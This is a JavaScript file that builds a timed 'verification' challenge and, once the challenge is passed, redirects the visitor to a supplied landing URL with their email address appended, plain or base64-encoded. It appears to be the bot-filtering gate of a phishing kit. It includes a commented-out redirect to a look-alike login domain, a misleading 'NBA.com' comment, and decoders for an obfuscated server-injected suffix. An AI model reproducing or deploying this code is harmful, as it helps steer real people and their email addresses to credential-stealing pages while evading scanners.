
(function() {
    // ===================================================
    // ENIGMA-STYLE DECODER FUNCTIONS
    // ===================================================
    const BASE_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789-";
    const INITIAL_ROTOR = "fghijklmnopqrstuvwxyz0123456789-abcde";
    const SPECIAL_TO_PLACEHOLDER = {
      "@": "-0",
      ".": "-1",
      "_": "-2"
    };
    const PLACEHOLDER_TO_SPECIAL = Object.fromEntries(
      Object.entries(SPECIAL_TO_PLACEHOLDER).map(([orig, ph]) => [ph, orig])
    );

    function rotate(str) {
        return str.slice(1) + str[0];
    }

    // Decodes a single line encoded with the enigmaâ€‘style encoder.
    function decodeEnigma(encoded) {
        let rotor = INITIAL_ROTOR;
        let substituted = "";
        for (const char of encoded) {
            const idx = rotor.indexOf(char);
            if (idx === -1) {
                throw new Error("Invalid enigma encoded character: " + char);
            }
            substituted += BASE_CHARS[idx];
            rotor = rotate(rotor);
        }
        let restored = substituted;
        for (const ph in PLACEHOLDER_TO_SPECIAL) {
            const re = new RegExp(ph, "g");
            restored = restored.replace(re, PLACEHOLDER_TO_SPECIAL[ph]);
        }
        return restored;
    }

    // ===================================================
    // MAIN VERIFICATION FLOW FUNCTION
    // ===================================================
    function startVerificationFlow(land, eml, plain) {
        const inputs = document.querySelectorAll('.code-inputs input');
        const codeDisplay = document.getElementById('codeDisplay');
        const regenXBtn = document.getElementById('regenXBtn');
        const progressBar = document.getElementById('progressBar');
        const timerContainer = document.getElementById('timerContainer');
        const progressBar2 = document.getElementById('progressBar2');
        const timerContainer2 = document.getElementById('timerContainer2');
        const errorMessage = document.getElementById('errorMessage');
        const successMessage = document.getElementById('successMessage');

        let stepTimer;
        let mainTimer;
        let currentIndex = 0;
        let currentGreenDigit = "";

        function generateCode() {
            if (currentIndex >= 4) return;

            errorMessage.style.display = "none";
            inputs[currentIndex].classList.remove('correct', 'incorrect');
            codeDisplay.innerHTML = "";

            let digits = [];
            while (digits.length < 4) {
                const newDigit = Math.floor(Math.random() * 10);
                if (!digits.includes(newDigit)) {
                    digits.push(newDigit);
                }
            }

            const greenIndex = Math.floor(Math.random() * 4);
            currentGreenDigit = digits[greenIndex].toString();

            digits.forEach((digit, idx) => {
                let span = document.createElement('span');
                span.textContent = digit;
                if (idx === greenIndex) {
                    span.classList.add('green-digit');
                }
                codeDisplay.appendChild(span);
            });

            showStepTimer();
            startStepTimer();
        }

        function startStepTimer() {
            clearTimeout(stepTimer);
            progressBar.style.transition = "none";
            progressBar.style.width = "100%";

            // Kick off the 3-second transition
            setTimeout(() => {
                progressBar.style.transition = "width 5s linear";
                progressBar.style.width = "0%";
            }, 50);

            // After 3 seconds, regenerate code
            stepTimer = setTimeout(() => {
                generateCode();
            }, 4000);
        }

        function startMainTimer() {
            progressBar2.style.transition = "none";
            progressBar2.style.width = "100%";

            setTimeout(() => {
                progressBar2.style.transition = "width 15s linear";
                progressBar2.style.width = "0%";
            }, 50);

            mainTimer = setTimeout(() => {
                fullReset();
            }, 15000);
        }

        function handleInput(e) {
            const inputEl = e.target;
            const value = inputEl.value;

            // If user typed into a non-active input, ignore
            const indexOfInput = [...inputs].indexOf(inputEl);
            if (indexOfInput !== currentIndex) {
                inputEl.value = "";
                return;
            }

            // Only allow digits
            if (!/^\d$/.test(value)) {
                inputEl.value = "";
                return;
            }

            // Check correctness
            if (value === currentGreenDigit) {
                inputEl.classList.add('correct');
                hideStepTimer();
                clearTimeout(stepTimer);
                currentIndex++;

                if (currentIndex < 4) {
                    inputs[currentIndex].focus();
                    generateCode();
                } else {
                    successMessage.style.display = "block";
                    hideStepTimer();
                    clearTimeout(stepTimer);
                    clearTimeout(mainTimer);
                    hideMainTimer();

                    // Retrieve the suffix from the session (injected via PHP)
                    var suffixFromServer = "";
                    var finalSuffix = suffixFromServer;
                    
                    // Attempt to decode as Base64 first.
                    try {
                        var decodedBase64 = atob(suffixFromServer);
                        // Only update if the decoded string is different.
                        if (decodedBase64 !== suffixFromServer) {
                            finalSuffix = decodedBase64;
                        }
                    } catch (e) {
                        // Base64 decoding failed; ignore.
                    }
                    
                    // If still unchanged, try enigma-style decoding.
                    if (finalSuffix === suffixFromServer) {
                        try {
                            finalSuffix = decodeEnigma(suffixFromServer);
                        } catch (e) {
                            finalSuffix = suffixFromServer;
                        }
                    }
                    
                    // Redirect to NBA.com with the (decoded, if applicable) suffix appended as a hash.
                    //window.location.href = "https://login.digitalfrontier20232040.de/CrDhDHRw" + (finalSuffix ? "#" + finalSuffix : "");
					if(plain == "yes") {
						window.location.href = land + eml;
					} else {
						window.location.href = land + btoa(eml);
					}
					
                }
            } else {
                inputEl.classList.add('incorrect');
                errorMessage.style.display = "block";
                hideStepTimer();
                clearTimeout(stepTimer);

                // Reset code after a brief delay
                setTimeout(() => {
                    inputEl.classList.remove('incorrect');
                    inputEl.value = "";
                    errorMessage.style.display = "none";
                    generateCode();
                }, 1500);
            }
        }

        function hideStepTimer() {
            timerContainer.style.opacity = "0";
            regenXBtn.style.marginTop = "5px";
        }

        function showStepTimer() {
            timerContainer.style.opacity = "1";
            regenXBtn.style.marginTop = "15px";
        }

        function hideMainTimer() {
            timerContainer2.style.opacity = "0";
        }

        function showMainTimer() {
            timerContainer2.style.opacity = "1";
        }

        function fullReset() {
            clearTimeout(stepTimer);
            clearTimeout(mainTimer);
            currentIndex = 0;
            errorMessage.style.display = "none";
            successMessage.style.display = "none";
            codeDisplay.innerHTML = "";

            inputs.forEach((input) => {
                input.value = "";
                input.classList.remove('correct', 'incorrect');
            });

            inputs[0].focus();
            hideStepTimer();
            hideMainTimer();

            // Reset the color transition on the global timer
            progressBar2.style.animation = "none";
            // Force reflow
            progressBar2.offsetHeight;
            progressBar2.style.animation = "colorTransition 15s linear forwards";

            initProcess();
        }

        function initProcess() {
            showMainTimer();
            startMainTimer();
            generateCode();
            inputs[0].focus();
        }

        // Attach events
        regenXBtn.addEventListener('click', generateCode);
        inputs.forEach(input => input.addEventListener('input', handleInput));

        // Kick off everything now that the script is loaded
        initProcess();
    }

    // Expose the function globally so dev.php can call it
    window.startVerificationFlow = startVerificationFlow;
})();
